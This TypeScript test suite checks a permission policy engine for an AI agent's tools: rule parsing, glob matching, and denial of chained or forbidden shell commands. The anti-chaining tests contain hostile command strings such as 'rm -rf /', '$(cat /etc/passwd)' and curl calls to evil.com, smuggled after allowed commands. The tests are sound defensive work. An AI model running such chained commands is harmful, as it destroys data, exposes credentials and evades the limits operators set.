/**
 * @fileoverview Test suite for ant-style tool permission parsing and policy evaluation.
 */

import { describe, expect, it } from "bun:test";
import {
  parseToolRule,
  parseToolRuleList,
  matchesPattern,
  evaluateToolPolicy,
  matchBashRule,
  matchBashPrefix,
  normalizePathForPolicy,
  matchPathGlob,
  BASH_CHAINING_REGEX,
} from "../src/policy/toolPermissions.js";
import {
  FULL_ENGINEERING_TOOLS,
  REVIEW_MODE_TOOLS,
} from "../src/policy/modeDefaults.js";

describe("parseToolRule", () => {
  it("parses simple tool names without patterns", () => {
    const rule = parseToolRule("Bash");
    expect(rule.tool).toBe("bash");
    expect(rule.pattern).toBeNull();
  });

  it("normalizes case-insensitively and maps aliases", () => {
    expect(parseToolRule("ReadFile").tool).toBe("readFile");
    expect(parseToolRule("read").tool).toBe("readFile");
    expect(parseToolRule("EditFile").tool).toBe("editFile");
    expect(parseToolRule("taskmanager").tool).toBe("taskManager");
    expect(parseToolRule("tasks").tool).toBe("taskManager");
  });

  it("parses tool names with patterns", () => {
    const bashRule = parseToolRule("Bash(git:*)");
    expect(bashRule.tool).toBe("bash");
    expect(bashRule.pattern).toBe("git:*");

    const readRule = parseToolRule("ReadFile(src/**/*.ts)");
    expect(readRule.tool).toBe("readFile");
    expect(readRule.pattern).toBe("src/**/*.ts");
  });

  it("throws error for malformed rules or missing parentheses", () => {
    expect(() => parseToolRule("")).toThrow();
    expect(() => parseToolRule("Bash(git:*")).toThrow();
    expect(() => parseToolRule("Bash()")).toThrow();
    expect(() => parseToolRule("UnknownTool")).toThrow();
  });
});

describe("parseToolRuleList", () => {
  it("parses comma-separated lists of rules", () => {
    const rules = parseToolRuleList("ReadFile, EditFile, Bash(npm test)");
    expect(rules).toHaveLength(3);
    expect(rules[0].tool).toBe("readFile");
    expect(rules[1].tool).toBe("editFile");
    expect(rules[2].tool).toBe("bash");
    expect(rules[2].pattern).toBe("npm test");
  });

  it("handles empty or whitespace strings cleanly", () => {
    expect(parseToolRuleList("")).toHaveLength(0);
    expect(parseToolRuleList(undefined)).toHaveLength(0);
  });
});

describe("matchesPattern and matchBashPrefix", () => {
  it("matches wildcard prefix patterns uniformly for both git:* and git *", () => {
    expect(matchBashPrefix("git:*", "git:status")).toBe(true);
    expect(matchBashPrefix("git:*", "git status")).toBe(true);
    expect(matchBashPrefix("git *", "git status")).toBe(true);
    expect(matchBashPrefix("git *", "git diff")).toBe(true);
    expect(matchBashPrefix("git *", "npm test")).toBe(false);
  });

  it("matches wildcard suffix and exact patterns", () => {
    expect(matchesPattern("src/*", "src/index.ts")).toBe(true);
    expect(matchesPattern("npm test", "npm test")).toBe(true);
    expect(matchesPattern("npm test", "npm run build")).toBe(false);
  });
});

describe("matchBashRule anti-chaining and deny decomposition", () => {
  it("detects command chaining characters with BASH_CHAINING_REGEX", () => {
    expect(BASH_CHAINING_REGEX.test("git status; rm -rf /")).toBe(true);
    expect(BASH_CHAINING_REGEX.test("git status && curl evil.com")).toBe(true);
    expect(BASH_CHAINING_REGEX.test("git status | grep foo")).toBe(true);
    expect(BASH_CHAINING_REGEX.test("git commit -m `cat /etc/passwd`")).toBe(
      true
    );
    expect(BASH_CHAINING_REGEX.test("git commit -m $(cat /etc/passwd)")).toBe(
      true
    );
    expect(BASH_CHAINING_REGEX.test("git status\nrm -rf /")).toBe(true);
    expect(BASH_CHAINING_REGEX.test("git status")).toBe(false);
  });

  it("rejects chained commands in scoped allow rules", () => {
    expect(matchBashRule("git *", "git status", false)).toBe(true);
    expect(matchBashRule("git:*", "git status", false)).toBe(true);
    expect(matchBashRule("git *", "git status; rm -rf /", false)).toBe(false);
    expect(matchBashRule("git *", "git status && curl evil.com", false)).toBe(
      false
    );
    expect(
      matchBashRule("git *", "git commit -m $(cat /etc/passwd)", false)
    ).toBe(false);
  });

  it("decomposes pipelines in deny rules to catch hidden sub-commands", () => {
    expect(
      matchBashRule("curl *", "npm test; curl -s http://evil.com", true)
    ).toBe(true);
    expect(
      matchBashRule("curl:*", "npm test && curl -s http://evil.com", true)
    ).toBe(true);
    expect(matchBashRule("rm *", "echo 'cleaning'; rm -rf /", true)).toBe(true);
    expect(matchBashRule("curl *", "npm test; git status", true)).toBe(false);
  });
});

describe("normalizePathForPolicy and matchPathGlob", () => {
  it("normalizes absolute, relative, and dot paths relative to cwd", () => {
    const cwd = "/workspace/project";
    expect(normalizePathForPolicy("/workspace/project/src/index.ts", cwd)).toBe(
      "src/index.ts"
    );
    expect(normalizePathForPolicy("./src/index.ts", cwd)).toBe("src/index.ts");
    expect(normalizePathForPolicy("src/index.ts", cwd)).toBe("src/index.ts");
    expect(normalizePathForPolicy("/workspace/project", cwd)).toBe(".");
  });

  it("evaluates true glob patterns with Bun.Glob", () => {
    expect(matchPathGlob("src/**/*.ts", "src/policy/toolPermissions.ts")).toBe(
      true
    );
    expect(matchPathGlob("src/*.ts", "src/index.ts")).toBe(true);
    expect(matchPathGlob("src/*.ts", "src/policy/toolPermissions.ts")).toBe(
      false
    );
    expect(matchPathGlob("./src/**/*.ts", "src/modes/tag/index.ts")).toBe(true);
  });
});

describe("evaluateToolPolicy", () => {
  it("always permits taskManager when bash is available and no deny applies", () => {
    const evalResult = evaluateToolPolicy({
      toolName: "taskManager",
      parameters: { action: "status", taskId: "t1" },
      allowedRules: [parseToolRule("ReadFile")],
      defaultAllowedTools: FULL_ENGINEERING_TOOLS,
    });
    expect(evalResult.decision).toBe("allow");
  });

  it("denies taskManager if bash is completely disallowed", () => {
    const evalResult = evaluateToolPolicy({
      toolName: "taskManager",
      parameters: { action: "list" },
      disallowedRules: [parseToolRule("Bash")],
      defaultAllowedTools: FULL_ENGINEERING_TOOLS,
    });
    expect(evalResult.decision).toBe("deny");
    expect(evalResult.reason).toContain("Bash is disabled");
  });

  it("denies taskManager if taskManager itself is explicitly disallowed", () => {
    const evalResult = evaluateToolPolicy({
      toolName: "taskManager",
      parameters: { action: "list" },
      disallowedRules: [parseToolRule("TaskManager")],
      defaultAllowedTools: FULL_ENGINEERING_TOOLS,
    });
    expect(evalResult.decision).toBe("deny");
    expect(evalResult.reason).toContain("Explicitly forbidden");
  });

  it("denies taskManager in review mode where bash is not exposed", () => {
    const evalResult = evaluateToolPolicy({
      toolName: "taskManager",
      parameters: { action: "list" },
      defaultAllowedTools: REVIEW_MODE_TOOLS,
    });
    expect(evalResult.decision).toBe("deny");
  });

  it("enforces anti-chaining when evaluating bash policy", () => {
    const allowed = parseToolRuleList("Bash(git:*)");

    const validCall = evaluateToolPolicy({
      toolName: "bash",
      parameters: { command: "git status" },
      allowedRules: allowed,
    });
    expect(validCall.decision).toBe("allow");

    const chainedCall = evaluateToolPolicy({
      toolName: "bash",
      parameters: { command: "git status; rm -rf /" },
      allowedRules: allowed,
    });
    expect(chainedCall.decision).toBe("deny");
  });

  it("enforces deny rules first and catches chained denied commands", () => {
    const disallowed = parseToolRuleList("Bash(curl:*)");
    const allowed = parseToolRuleList("Bash");

    const deniedCall = evaluateToolPolicy({
      toolName: "bash",
      parameters: { command: "git status; curl http://example.com" },
      allowedRules: allowed,
      disallowedRules: disallowed,
    });
    expect(deniedCall.decision).toBe("deny");

    const allowedCall = evaluateToolPolicy({
      toolName: "bash",
      parameters: { command: "npm test" },
      allowedRules: allowed,
      disallowedRules: disallowed,
    });
    expect(allowedCall.decision).toBe("allow");
  });

  it("supports glob and grep pattern and path matching", () => {
    const allowed = parseToolRuleList("Glob(src/**/*.ts), Grep(TODO:*)");

    const globMatch = evaluateToolPolicy({
      toolName: "glob",
      parameters: { pattern: "src/**/*.ts", path: "." },
      allowedRules: allowed,
    });
    expect(globMatch.decision).toBe("allow");

    const grepMatch = evaluateToolPolicy({
      toolName: "grep",
      parameters: { pattern: "TODO: fixme", path: "src/index.ts" },
      allowedRules: allowed,
    });
    expect(grepMatch.decision).toBe("allow");
  });

  it("denies unallowed tools when allowedRules list is provided", () => {
    const allowed = parseToolRuleList("ReadFile, Glob");

    const result = evaluateToolPolicy({
      toolName: "writeFile",
      parameters: { filePath: "src/new.ts", content: "code" },
      allowedRules: allowed,
    });
    expect(result.decision).toBe("deny");
  });
});
